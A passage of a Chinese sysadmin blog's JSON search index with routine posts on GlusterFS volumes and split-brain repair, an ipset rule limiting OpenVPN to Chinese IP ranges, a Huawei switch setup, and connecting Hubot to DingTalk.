/glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 人工查看一下两台机器的数据是否一致\n其它的脑裂文件也是一样处理。 没问题的话，重新挂载目录:\numount /nfsprimary /bin/mount -t glusterfs 10.10.10.21:/nfsp /nfsprimary/ ","permalink":"https://rendoumi.com/posts/20230330-glusterfs/","summary":"\u003ch2 id=\"特别注意\"\u003e特别注意\u003c/h2\u003e\n\u003cp\u003e两台GFS主机172.18.30.18和172.18.30.36上面务必配置/etc/hosts，否则peer的时候会有问题\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e172.18.30.18 renhe-18-30-18\r\n172.18.30.18 renhe-18-30-36\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch4 id=\"客户端安装\"\u003e客户端安装\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e然后 yum  install glusterfs-fuse 就可以了\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"挂载\"\u003e挂载：\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003emount.glusterfs 172.18.30.18:/borui-vol /data/br/nfs\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"fstab-自动挂载\"\u003efstab 自动挂载\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e172.18.30.18:/borui-vol /data/br/nfs glusterfs defaults,_netdev,backupvolfile-server=172.18.30.36 0 0\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"在172183018上建立新卷因为只有2个节点就必须force了\"\u003e在172.18.30.18上建立新卷，因为只有2个节点，就必须force了\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume create test-zhichi-vol replica \u003cspan class=\"m\"\u003e2\u003c/span\u003e transport tcp 172.18.30.18:/glusterfs/test-zhichi-vol 172.18.30.36:/glusterfs/test-zhichi-vol force\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"启动\"\u003e启动\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003egluster volume start test-zhichi-vol\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"查看一下\"\u003e查看一下\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003egluster volume info test-zhichi-vol\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"查看卷信息禁止查看inode太多了\"\u003e查看卷信息(禁止查看inode，太多了)\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume status test-zhichi-vol detail\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume status test-zhichi-vol clients\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume status test-zhichi-vol mem\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume status test-zhichi-vol fd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume status test-zhichi-vol inode\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"开启限额\"\u003e开启限额\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-zhichi-vol \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-zhichi-vol limit-usage / 50GB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-zhichi-vol list\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"限制ip访问\"\u003e限制IP访问\u003c/h4\u003e\n\u003cp\u003e例如允许172.18.31.*网段的主机访问rep-volume：\u003c/p\u003e","title":"GlusterFS的实际应用"},{"content":"突然来的个需求，要求屏蔽国外的用户登录公司的openvpn，防止滥用，搜了一下教程倒是真不少，问题不少都是要去下载那个无比大的ip地址库，好不容易找了一个可用的。\n记录下来，备用，原理很简单，ipset建立一个china的hashset，不停添加条目，最后用iptalbes阻挡一下：\n#!/bin/sh ipset create china hash:net hashsize 10000 maxelem 1000000 ipset add china 1.0.1.0/24 ...... ipset add china 91.234.36.0/24 iptables -I INPUT -m set --match-set china src -p udp -m udp --dport 1194 -j ACCEPT iptables -A INPUT -p udp --dport 1194 -j DROP 相应脚本的下载：\nipset-rules.txt\n","permalink":"https://rendoumi.com/posts/20230329-ipset_block/","summary":"\u003cp\u003e突然来的个需求，要求屏蔽国外的用户登录公司的openvpn，防止滥用，搜了一下教程倒是真不少，问题不少都是要去下载那个无比大的ip地址库，好不容易找了一个可用的。\u003c/p\u003e\n\u003cp\u003e记录下来，备用，原理很简单，ipset建立一个china的hashset，不停添加条目，最后用iptalbes阻挡一下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003eipset create china hash:net hashsize \u003cspan class=\"m\"\u003e10000\u003c/span\u003e maxelem \u003cspan class=\"m\"\u003e1000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipset add china 1.0.1.0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipset add china 91.234.36.0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -I INPUT -m \u003cspan class=\"nb\"\u003eset\u003c/span\u003e --match-set china src -p udp -m udp --dport \u003cspan class=\"m\"\u003e1194\u003c/span\u003e -j ACCEPT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -A INPUT -p udp --dport \u003cspan class=\"m\"\u003e1194\u003c/span\u003e -j DROP\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e相应脚本的下载：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"ipset-rules.txt\"\u003eipset-rules.txt\u003c/a\u003e\u003c/p\u003e","title":"使用ipset来禁止国外的用户登录openvpn"},{"content":"换了公司，也搞起了桌面运维，配置交换机的过程记录一下，其实很简单，就是命令记不住。\n拿到一台华为交换机，重新初始化后，配置如下：\n\u0026lt;HUAWEI\u0026gt;dis cur !Software Version V200R008C00SPC500 # sysname HUAWEI # aaa authentication-scheme default authorization-scheme default accounting-scheme default domain default domain default_admin local-user admin password irreversible-cipher %^%#7:.iL]+u\u0026#34;4\\j8ZFhGeg/-m.\u0026amp;\u0026#34;^0}kMznjk%\u0026gt;;BaUDO/\u0026#39;6m\\X\\=V8JGY:W;i,%^%# local-user admin service-type http # interface Vlanif1 # interface MEth0/0/1 # interface GigabitEthernet0/0/1 # interface NULL0 # user-interface con 0 authentication-mode password set authentication password cipher $1a$~!;$-JF0-W$Z\u0026gt;\u0026lt;1.F]\u0026lt;sF.R_NBj34CJ/JPe=/tZDMM(Ws3\u0026#39;9u%+$ user-interface vty 0 4 user-interface vty 16 20 # return 一、配名称 sysname BJ_FANGHENG_JIERU 二、配置登录用户 1、aaa local-user admin password irreversible-cipher abcdefg local-user admin privilege level 3 local-user admin service-type telnet terminal ssh 2、user-interface con 0 authentication-mode aaa 3、user-interface vty 0 4 authentication-mode aaa protocol inbound all 三、配置下联交换机端口 interface GigabitEthernet0/0/23 description == H3cSW --\u0026gt; 24 port link-type trunk port trunk allow-pass vlan 2 to 4094 四、配置上联交换机端口 interface GigabitEthernet0/0/24 description == RuijieRoute --\u0026gt; lan0 port link-type trunk port trunk allow-pass vlan 2 to 4094 五、配置vlan地址 vlan 11 vlan 100 vlan 11 interface Vlanif11 ip address 10.8.0.7 255.255.254.0 vlan 100 interface Vlanif100 ip address 192.168.10.7 255.255.255.0 六、配置缺省路由 ip route-static 0.0.0.0 0.0.0.0 10.8.0.1 七、批量配置端口 port-group group-member GigabitEthernet0/0/1 to GigabitEthernet0/0/23 port link-type access port default vlan 11 stp edged-port enable 八、lldp lldp enable 九、dhcp dhcp enable ip pool 11 gateway-list 10.8.0.1 network 10.8.0.0 mask 255.255.254.0 static-bind ip-address 10.8.0.4 mac-address 8005-88f1-fa62 dns-list 114.114.114.114 interface Vlanif11 description === Ke hu duan ip address 10.8.0.1 255.255.254.0 dhcp select global 十、telnet和ssh dsa local-key-pair create telnet server enable stelnet server enable ssh authentication-type default password 这样就完成了一台核心设备的简单配置\n","permalink":"https://rendoumi.com/posts/20230324-huawei_switch/","summary":"\u003cp\u003e换了公司，也搞起了桌面运维，配置交换机的过程记录一下，其实很简单，就是命令记不住。\u003c/p\u003e\n\u003cp\u003e拿到一台华为交换机，重新初始化后，配置如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;HUAWEI\u0026gt;dis cur\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e!Software Version V200R008C00SPC500\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esysname HUAWEI\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e authentication-scheme default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e authorization-scheme default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e accounting-scheme default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e domain default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e domain default_admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e local-user admin password irreversible-cipher %^%#7:.iL\u003cspan class=\"o\"\u003e]\u003c/span\u003e+u\u003cspan class=\"s2\"\u003e\u0026#34;4\\j8ZFhGeg/-m.\u0026amp;\u0026#34;\u003c/span\u003e^0\u003cspan class=\"o\"\u003e}\u003c/span\u003ekMznjk%\u0026gt;\u003cspan class=\"p\"\u003e;\u003c/span\u003eBaUDO/\u003cspan class=\"s1\"\u003e\u0026#39;6m\\X\\=V8JGY:W;i,%^%#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e local-user admin service-type http\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003einterface Vlanif1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003einterface MEth0/0/1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003einterface GigabitEthernet0/0/1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#                                         \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003einterface NULL0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003euser-interface con 0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e authentication-mode password\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e set authentication password cipher $1a$~!;$-JF0-W$Z\u0026gt;\u0026lt;1.F]\u0026lt;sF.R_NBj34CJ/JPe=/tZDMM(Ws3\u0026#39;\u003c/span\u003e9u%+$\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euser-interface vty \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euser-interface vty \u003cspan class=\"m\"\u003e16\u003c/span\u003e \u003cspan class=\"m\"\u003e20\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"一配名称\"\u003e一、配名称\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esysname BJ_FANGHENG_JIERU\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"二配置登录用户\"\u003e二、配置登录用户\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e1、aaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocal-user admin password irreversible-cipher abcdefg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocal-user admin privilege level \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocal-user admin service-type telnet terminal ssh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2、user-interface con \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauthentication-mode aaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3、user-interface vty \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauthentication-mode aaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eprotocol inbound all\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"三配置下联交换机端口\"\u003e三、配置下联交换机端口\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einterface GigabitEthernet0/0/23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003edescription\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e H3cSW --\u0026gt; \u003cspan class=\"m\"\u003e24\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e port link-type trunk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e port trunk allow-pass vlan \u003cspan class=\"m\"\u003e2\u003c/span\u003e to \u003cspan class=\"m\"\u003e4094\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"四配置上联交换机端口\"\u003e四、配置上联交换机端口\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einterface GigabitEthernet0/0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003edescription\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e RuijieRoute --\u0026gt; lan0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e port link-type trunk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e port trunk allow-pass vlan \u003cspan class=\"m\"\u003e2\u003c/span\u003e to \u003cspan class=\"m\"\u003e4094\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"五配置vlan地址\"\u003e五、配置vlan地址\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evlan \u003cspan class=\"m\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evlan \u003cspan class=\"m\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evlan \u003cspan class=\"m\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e interface Vlanif11\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e ip address 10.8.0.7 255.255.254.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evlan \u003cspan class=\"m\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e interface Vlanif100\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e ip address 192.168.10.7 255.255.255.0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"六配置缺省路由\"\u003e六、配置缺省路由\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip route-static 0.0.0.0 0.0.0.0 10.8.0.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"七批量配置端口\"\u003e七、批量配置端口\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eport-group group-member GigabitEthernet0/0/1 to GigabitEthernet0/0/23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eport link-type access\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eport default vlan \u003cspan class=\"m\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estp edged-port \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"八lldp\"\u003e八、lldp\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elldp \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"九dhcp\"\u003e九、dhcp\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip pool \u003cspan class=\"m\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e gateway-list 10.8.0.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e network 10.8.0.0 mask 255.255.254.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e static-bind ip-address 10.8.0.4 mac-address 8005-88f1-fa62\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e dns-list 114.114.114.114\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einterface Vlanif11\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003edescription\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e Ke hu duan\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e ip address 10.8.0.1 255.255.254.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e dhcp \u003cspan class=\"k\"\u003eselect\u003c/span\u003e global\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"十telnet和ssh\"\u003e十、telnet和ssh\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edsa local-key-pair create\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etelnet server \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estelnet server \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh authentication-type default password\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样就完成了一台核心设备的简单配置\u003c/p\u003e","title":"核心交换机的配置过程"},{"content":"换了公司，现在的公司用的是钉钉，不是企业微信，那么 hubot 就得改接入钉钉了\n前文回顾：Hubot集成企业微信+jenkins+ansible\n不明白的可以先看那一篇，那么首先的步骤是一样的，同样要去钉钉开放平台，用管理员登录：\nhttps://open.dingtalk.com/\n登陆后，点击应用开发\u0026ndash;\u0026gt;企业应用开发：\n’\n然后应用开发，机器人，点击创建应用：\n建好后，点击应用信息，可以看到应用凭证\n我们记录下来 AppSecret，之后要用到\n然后再点击开发管理，这里需要你把 hubot 的服务器地址给公布出去，需要有个公网地址\n因为hubot是监听的8080端口，所以映射是 xxxx.ip:80 \u0026ndash;\u0026gt; hubotip:8080\n服务器出口 IP 的地方 , 需要在 hubot 的服务器上，curl http://ipinfo.io，得到地址，然后填上（我们的 ip 非常特殊，每一次访问都有可能会换个ip，所以只好把整段填写进去，而且把公网映射ip也填进去）\n消息接收地址填上映射后的地址：https://bot.rendoumi.com/hubot/dingtalk/message/（用不用nginx加证书变https随具体情况定）\n然后去hubot安装dingtalk插件，在hubot安装根目录运行\nnpm install hubot-dingtalk export HUBOT_DINGTALK_AUTH_TYPE=sign export HUBOT_DINGTALK_SECRET=xxxxxxxxxx export HUBOT_DINGTALK_MODE=1 ./bin/hubot -a dingtalk 然后我们去用浏览器访问 https://bot.rendoumi.com/hubot/dingtalk/message/，会返回这个\n然后就可以了。至于把 hubot 做成服务，就参考上一篇文章，把jenkins和ansible都加上，做一个好用的机器人。\n","permalink":"https://rendoumi.com/posts/20230301-hubot_dingding/","summary":"\u003cp\u003e换了公司，现在的公司用的是钉钉，不是企业微信，那么 hubot 就得改接入钉钉了\u003c/p\u003e\n\u003cp\u003e前文回顾：\u003ca 